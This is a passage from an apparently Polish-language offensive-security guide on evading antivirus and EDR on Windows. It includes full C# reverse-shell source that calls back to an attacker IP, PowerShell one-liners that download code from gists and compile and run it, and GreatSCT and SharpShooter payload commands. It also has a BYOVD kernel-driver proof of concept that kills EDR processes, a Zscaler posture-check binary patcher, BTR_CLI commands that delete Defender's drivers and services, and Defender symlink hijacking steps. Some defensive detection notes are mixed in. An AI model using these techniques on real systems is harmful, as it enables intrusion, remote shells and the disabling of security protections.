- Nie uruchamiaj `winvnc`, jeśli już działa, bo wywołasz [wyskakujące okno](https://i.imgur.com/1SROTTl.png). Sprawdź, czy działa, za pomocą `tasklist | findstr winvnc`
- Nie uruchamiaj `winvnc` bez pliku `UltraVNC.ini` w tym samym katalogu, bo otworzy się [okno konfiguracji](https://i.imgur.com/rfMQWcf.png)
- Nie uruchamiaj `winvnc -h`, aby wyświetlić pomoc, bo wywołasz [wyskakujące okno](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Pobierz z: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)

```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```

W GreatSCT:

```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```

Teraz **uruchom listener** za pomocą `msfconsole -r file.rc` i **wykonaj** **payload XML** przy użyciu:

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```

**Obecny Defender szybko zakończy proces.**

### Kompilowanie własnego reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Pierwszy C# Revershell

Skompiluj go za pomocą:

```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```

Użyj tego z:

```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
	public class Program
	{
		static StreamWriter streamWriter;

		public static void Main(string[] args)
		{
			using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
			{
				using(Stream stream = client.GetStream())
				{
					using(StreamReader rdr = new StreamReader(stream))
					{
						streamWriter = new StreamWriter(stream);

						StringBuilder strInput = new StringBuilder();

						Process p = new Process();
						p.StartInfo.FileName = "cmd.exe";
						p.StartInfo.CreateNoWindow = true;
						p.StartInfo.UseShellExecute = false;
						p.StartInfo.RedirectStandardOutput = true;
						p.StartInfo.RedirectStandardInput = true;
						p.StartInfo.RedirectStandardError = true;
						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
						p.Start();
						p.BeginOutputReadLine();

						while(true)
						{
							strInput.Append(rdr.ReadLine());
							//strInput.Append("\n");
							p.StandardInput.WriteLine(strInput);
							strInput.Remove(0, strInput.Length);
						}
					}
				}
			}
		}

		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }

	}
}
```

### C# z użyciem kompilatora

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```

[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Automatyczne pobieranie i uruchamianie:

```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```


{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Lista obfuskatorów C#: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++

```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```

- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](https://github.com/l0ss/Grouper2)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Przykład użycia Pythona do tworzenia injectorów:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Inne narzędzia

```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```

### Więcej

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – wyłączanie AV/EDR z poziomu jądra

Storm-2603 wykorzystał niewielkie narzędzie konsolowe o nazwie **Antivirus Terminator**, aby wyłączyć zabezpieczenia punktów końcowych przed wdrożeniem ransomware. Narzędzie dostarcza **własny podatny, ale *podpisany* sterownik** i wykorzystuje go do wykonywania uprzywilejowanych operacji w jądrze, których nie mogą zablokować nawet usługi AV działające w trybie Protected-Process-Light (PPL).<sup>[[12]](#references)</sup>

Najważniejsze wnioski
1. **Podpisany sterownik**: Plik zapisywany na dysku to `ServiceMouse.sys`, ale jest to legalnie podpisany sterownik `AToolsKrnl64.sys` z „System In-Depth Analysis Toolkit” firmy Antiy Labs. Ponieważ sterownik ma prawidłowy podpis Microsoftu, ładuje się nawet wtedy, gdy włączone jest wymuszanie podpisów sterowników (DSE).
2. **Instalacja usługi**:
   ```powershell
   sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
   sc start  ServiceMouse
   ```
   Pierwszy wiersz rejestruje sterownik jako **usługę jądra**, a drugi go uruchamia, dzięki czemu `\\.\ServiceMouse` staje się dostępny z przestrzeni użytkownika.
3. **IOCTL-e udostępniane przez sterownik**
   | Kod IOCTL | Możliwość                              |
   |-----------:|-----------------------------------------|
   | `0x99000050` | Zakończenie dowolnego procesu na podstawie PID (używane do zabijania usług Defender/EDR) |
   | `0x990000D0` | Usunięcie dowolnego pliku z dysku |
   | `0x990001D0` | Wyładowanie sterownika i usunięcie usługi |

   Minimalny proof-of-concept w C:
   ```c
   #include <windows.h>
   
   int main(int argc, char **argv){
       DWORD pid = strtoul(argv[1], NULL, 10);
       HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
       DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
       CloseHandle(hDrv);
       return 0;
   }
   ```
4. **Dlaczego to działa**: BYOVD całkowicie omija zabezpieczenia w trybie użytkownika; kod wykonywany w jądrze może otwierać *chronione* procesy, kończyć je lub modyfikować obiekty jądra, niezależnie od PPL/PP, ELAM czy innych funkcji hardeningu.

Wykrywanie / ograniczanie ryzyka
• Włącz listę blokowanych podatnych sterowników Microsoftu (`HVCI`, `Smart App Control`), aby Windows odmawiał załadowania `AToolsKrnl64.sys`.
• Monitoruj tworzenie nowych usług *jądra* i generuj alerty, gdy sterownik zostanie załadowany z katalogu z prawami zapisu dla wszystkich lub nie znajduje się na liście dozwolonych.
• Monitoruj uchwyty z trybu użytkownika do niestandardowych obiektów urządzeń, po których następują podejrzane wywołania `DeviceIoControl`.

### Omijanie kontroli stanu urządzenia Zscaler Client Connector przez patchowanie plików binarnych na dysku

**Client Connector** firmy Zscaler stosuje lokalnie reguły stanu urządzenia i polega na Windows RPC, aby przekazywać wyniki innym komponentom. Dwie słabe decyzje projektowe umożliwiają całkowite ominięcie tych kontroli:

1. Ocena stanu urządzenia odbywa się **w całości po stronie klienta** (na serwer wysyłana jest wartość logiczna).
2. Wewnętrzne punkty końcowe RPC sprawdzają jedynie, czy łączący się plik wykonywalny jest **podpisany przez Zscaler** (za pomocą `WinVerifyTrust`).<sup>[[11]](#references)</sup>

Przez **patchowanie czterech podpisanych plików binarnych na dysku** można zneutralizować oba mechanizmy:

| Plik binarny | Oryginalna logika poddana patchowaniu | Wynik |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Zawsze zwraca `1`, więc każda kontrola kończy się zgodnością |
| `ZSAService.exe` | Pośrednie wywołanie `WinVerifyTrust` | NOP-ed ⇒ dowolny proces (nawet niepodpisany) może połączyć się z potokami RPC |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Zastąpione przez `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Kontrole integralności tunelu | Pominięte |

Minimalny fragment patchera:

```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
    data = f.read()
    off = data.find(pattern)
    if off == -1:
        print("pattern not found")
    else:
        f.seek(off)
        f.write(replacement)
```

Po zastąpieniu oryginalnych plików i ponownym uruchomieniu stosu usług:

* **Wszystkie** kontrole stanu wyświetlają status **zielony/zgodny**.
* Niepodpisane lub zmodyfikowane pliki binarne mogą otwierać punkty końcowe RPC oparte na nazwanych potokach (np. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Zaatakowany host uzyskuje nieograniczony dostęp do sieci wewnętrznej zdefiniowanej przez zasady Zscaler.

To studium przypadku pokazuje, jak kilka poprawek bajtów wystarczy, by obejść decyzje dotyczące zaufania podejmowane wyłącznie po stronie klienta oraz proste kontrole podpisów.

## Nadużycie zaufanej funkcjonalności Microsoft Defender `BTR.sys`

Sterownik **Boot-Time Removal** Defendera stanowi użyteczny kontrprzykład dla klasycznego BYOVD. `BTR.sys` to legalny komponent naprawczy podpisany przez Microsoft, bez błędu powodującego uszkodzenie pamięci i interfejsu IOCTL; po uzyskaniu dostępu administratora i `SeLoadDriverPrivilege` operator może zamiast tego sfałszować prywatną transakcję naprawczą i uzyskać zamierzone operacje na plikach/rejestrze w Ring-0. Jest to **mechanizm neutralizacji AV/EDR po przejęciu systemu, a nie uzyskania początkowego dostępu ani eskalacji uprawnień**. Sterownik można wyodrębnić z zasobu `BOOTTIMETOOL` w pliku `MpEngine.dll` na zaatakowanym hoście, zamiast importować rzucający się w oczy sterownik innej firmy.<sup>[[36]](#references)</sup>

### Przygotowanie jednorazowego sterownika

Defender zwykle zapisuje zasób jako plik o losowej nazwie `[a-z]{8}.sys` i rejestruje usługę jądra o podobnej nazwie. `DriverEntry` odczytuje wartość `Args` usługi, otwiera wskazany NTFS ADS, odszyfrowuje i weryfikuje listę działań, zapisuje informacje zwrotne, a po pomyślnym wykonaniu zwraca `0xC0000056` (`STATUS_DELETE_PENDING`), dzięki czemu sterownik zostaje wyładowany, zamiast pozostać załadowanym. Sfałszowana usługa ma następujące charakterystyczne wartości.<sup>[[36]](#references)[[37]](#references)</sup>

```text
Type         = 1
Start        = 1
ErrorControl = 0
ImagePath    = \??\C:\Windows\System32\drivers\<random>.sys
Group        = Boot Bus Extender
Args         = C:\Windows\System32\drivers\<random>.sys:changelist
```

Strumień `:changelist` zawiera jeden blob zaszyfrowany RC4. Analizowane kompilacje ponownie używają stałego klucza 256-bajtowego, więc szyfrowanie nie stanowi granicy autoryzacji. Poprawny tekst jawny zawiera 24-bajtowy nagłówek globalny (`Magic=0xFEE1DEAD`, `Version=2`, `PayloadOffset=0x10`, CRC nagłówka i identyfikator transakcji wyprowadzony z payloadu), po którym następuje zakończona znakiem null ścieżka do pliku sprzężenia zwrotnego w UTF-16 oraz dowolna liczba elementów. Każdy element ma 16-bajtowy nagłówek (`DataSize`, `Action`, `HeaderCRC`, `DataCRC`) i dane właściwe dla danej akcji, zakończone **dokładnie czterema bajtami NUL**. Każdy obszar nagłówka/danych jest sprawdzany niezależnie przy użyciu CRC-32 z wielomianem `0xEDB88320`, stanem początkowym `0xFFFFFFFF` i **bez końcowego XOR** (`~CRC32`); stan CRC jest zerowany dla każdego obszaru.<sup>[[36]](#references)[[37]](#references)</sup>

Obsługiwane identyfikatory akcji udostępniają następujące prymitywy jądra.<sup>[[36]](#references)[[37]](#references)</sup>

| ID | Dane elementu | Wynik |
| --- | --- | --- |
| 1 | `[ścieżka UTF-16]` | Usunięcie pliku, również zablokowanego |
| 2 | `[ścieżka UTF-16]` | Usunięcie pustego katalogu |
| 3 | `[Flagi][źródło][cel]` | Przeniesienie pliku do chronionej ścieżki wybranej przez atakującego; pusty cel oznacza usunięcie |
| 4 | `[Flagi][ścieżka klucza]` | Rekurencyjne usunięcie klucza rejestru |
| 5 | `[Flagi][ścieżka klucza + "\\" + wartość]` | Usunięcie wartości rejestru |
| 6 | `[Flagi][typ][rozmiar][ścieżka klucza + "\\" + wartość][dane]` | Utworzenie/zaktualizowanie wartości rejestru oraz utworzenie brakujących ścieżek kluczy |

W akcjach 5 i 6 separatorem klucza/wartości w formacie przesyłanym jest **dwa kolejne ukośniki odwrotne**; ścieżka sformatowana zgodnie ze zwyczajową konwencją nie zostanie poprawnie podzielona. Plik sprzężenia zwrotnego w większości odzwierciedla żądanie, ale pierwsze cztery bajty danych każdego elementu stają się jego wynikowym `NTSTATUS`. W przypadku akcji 1 i 2, które nie mają pola początkowych flag, BTR przenosi ścieżkę do czterech zarezerwowanych bajtów końcowych, aby zrobić miejsce na ten status.<sup>[[36]](#references)</sup>

### Przepływ pracy `BTR_CLI` i okno wczesnego rozruchu

[`BTR_CLI`](https://github.com/Dump-GUY/BTR_CLI) implementuje cały łańcuch działań: wyodrębnia `BTR.sys` z lokalnego Defendera, tworzy `<random>.sys:changelist` i strumień sprzężenia zwrotnego, serializuje/sumuje kontrolnie/szyfruje połączone akcje, bezpośrednio tworzy klucz rejestru usługi, a następnie wywołuje `NtLoadDriver` dla `-trigger now` lub pozostawia sterownik do uruchomienia przy starcie systemu dla `-trigger boot`. Bezpośrednie przygotowanie rejestru omija standardową ścieżkę SCM `CreateServiceW`, dlatego **nie powoduje** wygenerowania zdarzenia Service Install o identyfikatorze 7045. Artefakty uruchamiane podczas rozruchu można później usunąć za pomocą `BTR_CLI.exe -cleanup <service_name>`.<sup>[[36]](#references)[[37]](#references)</sup>

```powershell
# Runtime: remove protected security-service registrations from Ring 0
BTR_CLI.exe -chain -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WdFilter" -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" -trigger now

# Boot: delete a security driver before its user-mode protection stack starts
BTR_CLI.exe -a 1 -s "C:\Windows\System32\drivers\wd\WdFilter.sys" -trigger boot
```

`Start=0` nie nadaje się do użycia, ponieważ BTR wykonuje operacje wejścia/wyjścia na plikach z poziomu `DriverEntry`, zanim stos pamięci masowej i link `SystemRoot` będą gotowe. `Start=1` wraz z grupą o wysokim priorytecie `Boot Bus Extender` powoduje natomiast wykonanie w Phase 1: NTFS jest już dostępny, ale wiele sterowników zabezpieczeń uruchamianych podczas startu systemu i usług EDR w trybie użytkownika nie zostało jeszcze zainicjowanych. Filtry uruchamiane podczas startu systemu, takie jak `WdFilter`, mogą być już załadowane, ale BTR może usunąć ich pliki binarne lub konfigurację usługi przed kolejnym uruchomieniem, a także usunąć pliki wykonywalne usług, zanim uruchomi je SCM. ELAM nie zamyka tej luki, ponieważ BTR działa po ocenie sterowników startowych i ma prawidłowy podpis Microsoft.<sup>[[36]](#references)</sup>

Wiele działań wykonuje się w ramach jednej transakcji. PoC dodaje jako pierwszą Action 1 dla zakodowanej na stałe ścieżki `\SystemRoot\Temp\BootClean.log`: BTR tworzy ten plik dziennika, a następnie realizuje własne żądanie usunięcia i usuwa go przed wyładowaniem. Ogranicza to ilość śladów, a umieszczenie informacji zwrotnej w `<random>.sys:<random>.dat` pozwala usunąć sterownik i oba strumienie jednocześnie.<sup>[[36]](#references)[[37]](#references)</sup>

### Korelacje o wysokiej wartości sygnału

Reguły oparte wyłącznie na sygnaturach oraz lista blokowanych podatnych sterowników Microsoftu nie przeciwdziałają nadużyciom zamierzonej funkcjonalności BTR. Preferuj poniższe korelacje behawioralne, odróżniając przy tym legalne pochodzenie Defendera od dowolnego programu uruchamiającego.<sup>[[36]](#references)</sup>

- **Sysmon 15:** Utworzenie `.sys:changelist` jest nieodłącznym elementem przygotowania BTR. ADS `.dat` dołączony do tego samego pliku `.sys` jest szczególnie podejrzany, ponieważ legalny Defender zwykle umieszcza informacje zwrotne w `C:\ProgramData\Microsoft\Windows Defender\Scans\RebootActions\`.
- **Sysmon 12/13 bez System 7045:** Koreluj bezpośrednie utworzenie `HKLM\SYSTEM\CurrentControlSet\Services\<random>` zawierającego `Args=...:changelist` i `Group=Boot Bus Extender` z brakiem odpowiadającego mu zdarzenia instalacji SCM.
- **Sysmon 6 -> 23:** Koreluj załadowanie znanego sterownika BTR, którego pochodzenie nie wiąże się z Defenderem, z późniejszym usunięciem plików przypisanym do `System`/PID 4, szczególnie w przypadku plików binarnych związanych z bezpieczeństwem.
- **Sysmon 11 -> 23:** Generuj alert w przypadku szybkiego utworzenia i usunięcia `\SystemRoot\Temp\BootClean.log` przez `System`/PID 4.
- Ograniczaj i audytuj przydzielanie/włączanie `SeLoadDriverPrivilege`; sam podpis Microsoftu nie wystarcza, by uznać działanie za zaufane, gdy sterownik narzędzia zabezpieczającego jest przygotowywany przez `cmd.exe`, PowerShell lub nieznany proces.

## Nadużywanie Protected Process Light (PPL) do ingerowania w AV/EDR za pomocą LOLBIN-ów

Protected Process Light (PPL) wymusza hierarchię sygnatur/poziomów, tak aby tylko procesy o równym lub wyższym poziomie ochrony mogły ingerować w siebie nawzajem. Z punktu widzenia atakującego, jeśli możesz legalnie uruchomić plik binarny z obsługą PPL i kontrolować jego argumenty, możesz wykorzystać benign funkcjonalność (np. rejestrowanie) jako ograniczony, oparty na PPL mechanizm zapisu w chronionych katalogach używanych przez AV/EDR.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

Co sprawia, że proces działa jako PPL
- Docelowy plik EXE (oraz wszystkie załadowane pliki DLL) musi być podpisany przy użyciu EKU obsługującego PPL.
- Proces należy utworzyć za pomocą CreateProcess z flagami: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Należy zażądać zgodnego poziomu ochrony, który odpowiada sygnatariuszowi pliku binarnego (np. `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` dla sygnatariuszy anti-malware, `PROTECTION_LEVEL_WINDOWS` dla sygnatariuszy Windows). Nieprawidłowe poziomy spowodują niepowodzenie tworzenia procesu.

Zobacz także szersze wprowadzenie do PP/PPL i ochrony LSASS:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Narzędzia do uruchamiania
- Pomocnicze narzędzie open source: CreateProcessAsPPL (wybiera poziom ochrony i przekazuje argumenty do docelowego pliku EXE):
  - [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)<sup>[[19]](#references)</sup>
- Schemat użycia:

```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```

Primitive LOLBIN: ClipUp.exe
- Podpisany plik binarny systemu `C:\Windows\System32\ClipUp.exe` uruchamia sam siebie i przyjmuje parametr określający ścieżkę, pod którą ma zapisać plik dziennika.
- Po uruchomieniu jako proces PPL zapis pliku odbywa się z uprawnieniami PPL.
- ClipUp nie potrafi przetwarzać ścieżek zawierających spacje; użyj krótkich ścieżek 8.3, aby wskazać normalnie chronione lokalizacje.

Pomocniki do krótkich ścieżek 8.3
- Wyświetl krótkie nazwy: `dir /x` w każdym katalogu nadrzędnym.
- Wyznacz krótką ścieżkę w cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Łańcuch nadużycia (zarys)
1) Uruchom LOLBIN obsługujący PPL (ClipUp) z flagą `CREATE_PROTECTED_PROCESS`, używając launchera (np. CreateProcessAsPPL).
2) Przekaż argument ścieżki dziennika ClipUp, aby wymusić utworzenie pliku w chronionym katalogu AV (np. Defender Platform). W razie potrzeby użyj krótkich nazw 8.3.
3) Jeśli AV normalnie ma otwarty/zablokowany plik docelowy podczas działania (np. MsMpEng.exe), zaplanuj zapis podczas rozruchu, zanim uruchomi się AV, instalując usługę autostartową, która niezawodnie uruchamia się wcześniej. Zweryfikuj kolejność uruchamiania podczas rozruchu za pomocą Process Monitor (rejestrowanie rozruchu).
4) Po ponownym uruchomieniu zapis z uprawnieniami PPL następuje, zanim AV zablokuje swoje pliki binarne, uszkadzając plik docelowy i uniemożliwiając uruchomienie.

Przykładowe wywołanie (ścieżki zanonimizowane/skrócone ze względów bezpieczeństwa):

```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```

Uwagi i ograniczenia
- Nie masz kontroli nad zawartością zapisywaną przez ClipUp — poza jej lokalizacją; ta metoda nadaje się do uszkadzania, a nie precyzyjnego wstrzykiwania zawartości.
- Do zainstalowania/uruchomienia usługi i wykorzystania okna na ponowne uruchomienie wymagane są lokalne uprawnienia administratora/SYSTEM.
- Kluczowe jest odpowiednie wyczucie czasu: cel nie może być otwarty; wykonanie podczas rozruchu pozwala uniknąć blokad plików.

Wykrywanie
- Tworzenie procesu `ClipUp.exe` z nietypowymi argumentami, zwłaszcza gdy proces nadrzędny to niestandardowy program uruchamiający, w pobliżu momentu rozruchu.
- Nowe usługi skonfigurowane do automatycznego uruchamiania podejrzanych plików binarnych i uruchamiające się konsekwentnie przed Defender/AV. Zbadaj tworzenie/modyfikowanie usług poprzedzające awarie uruchamiania Defendera.
- Monitorowanie integralności plików binarnych Defendera/katalogów Platform; nieoczekiwane tworzenie/modyfikowanie plików przez procesy z flagami protected-process.
- Telemetria ETW/EDR: szukaj procesów utworzonych z `CREATE_PROTECTED_PROCESS` oraz anomalii w użyciu poziomu PPL przez pliki binarne niezwiązane z AV.

Środki zaradcze
- WDAC/Code Integrity: ogranicz, które podpisane pliki binarne mogą działać jako PPL i w jakim kontekście procesu nadrzędnego; blokuj uruchamianie ClipUp poza uzasadnionymi kontekstami.
- Higiena usług: ogranicz tworzenie/modyfikowanie usług uruchamianych automatycznie i monitoruj manipulowanie kolejnością ich uruchamiania.
- Upewnij się, że ochrona przed manipulacją Defendera i zabezpieczenia wczesnego uruchamiania są włączone; badaj błędy uruchamiania wskazujące na uszkodzenie plików binarnych.
- Rozważ wyłączenie generowania krótkich nazw 8.3 na woluminach zawierających narzędzia bezpieczeństwa, jeśli jest to zgodne z Twoim środowiskiem (dokładnie przetestuj).

## Manipulowanie Microsoft Defender przez przejęcie symlinków katalogu wersji Platform

Windows Defender wybiera platformę, z której działa, wyliczając podfoldery w:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Wybiera podfolder o najwyższym leksykograficznie ciągu wersji (np. `4.18.25070.5-0`), a następnie uruchamia z niego procesy usługi Defender (odpowiednio aktualizując ścieżki usług/rejestru). Ten wybór ufa wpisom katalogu, w tym punktom ponownej analizy będącym katalogami (symlinkom). Administrator może wykorzystać tę właściwość, aby przekierować Defendera do ścieżki zapisywalnej przez atakującego i doprowadzić do sideloadingu DLL lub zakłócenia działania usługi.<sup>[[21]](#references)[[22]](#references)</sup>

Wymagania wstępne
- Lokalny administrator (wymagany do tworzenia katalogów/symlinków w folderze Platform)
- Możliwość ponownego uruchomienia systemu lub wywołania ponownego wyboru platformy Defendera (ponowne uruchomienie usługi podczas rozruchu)
- Wymagane są tylko wbudowane narzędzia (`mklink`)

Dlaczego to działa
- Defender blokuje zapisy we własnych folderach, ale wybór platformy ufa wpisom katalogu i wybiera wersję o najwyższej wartości leksykograficznej, nie sprawdzając, czy cel prowadzi do chronionej/zaufanej ścieżki.

Instrukcja krok po kroku (przykład)
1) Przygotuj zapisywalną kopię bieżącego folderu platformy, np. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Utwórz wewnątrz Platform dowiązanie symboliczne do katalogu o wyższej wersji, wskazujące na twój folder:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Wybór wyzwalacza (zalecany restart):
```cmd
shutdown /r /t 0
```
4) Zweryfikuj, czy MsMpEng.exe (WinDefend) jest uruchamiany ze przekierowanej ścieżki:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Należy zauważyć nową ścieżkę procesu w `C:\TMP\AV\` oraz konfigurację usługi/rejestru odzwierciedlającą tę lokalizację.

Opcje post-exploitation
- DLL sideloading/code execution: Umieść lub podmień biblioteki DLL ładowane przez Defender z jego katalogu aplikacji, aby wykonać kod w procesach Defender. Zobacz sekcję powyżej: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: Usuń symlink wersji, aby przy następnym uruchomieniu skonfigurowana ścieżka nie wskazywała na właściwy plik, a Defender nie mógł się uruchomić:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```

> [!TIP]
> Pamiętaj, że ta technika sama w sobie nie umożliwia eskalacji uprawnień; wymaga praw administratora.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Red teamy mogą przenieść runtime evasion z implantu C2 do samego modułu docelowego, hookując jego Import Address Table (IAT) i kierując wybrane API do kontrolowanego przez atakującego, niezależnego od położenia kodu (PIC). Rozszerza to evasion poza niewielki zestaw API udostępnianych przez wiele kitów (np. CreateProcessA) i zapewnia te same zabezpieczenia dla BOF-ów oraz bibliotek DLL używanych w post-exploitation.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

Podejście ogólne
- Umieść blob PIC obok modułu docelowego za pomocą reflective loadera (dołączonego na początku lub jako plik towarzyszący). PIC musi być samowystarczalny i niezależny od położenia.
- Gdy hostująca biblioteka DLL jest ładowana, przejdź przez jej IMAGE_IMPORT_DESCRIPTOR i zmień wpisy IAT dla docelowych importów (np. CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc), aby wskazywały na proste wrappery PIC.
- Każdy wrapper PIC wykonuje evasion, a następnie przekazuje wywołanie do właściwego adresu API. Typowe techniki evasion obejmują:
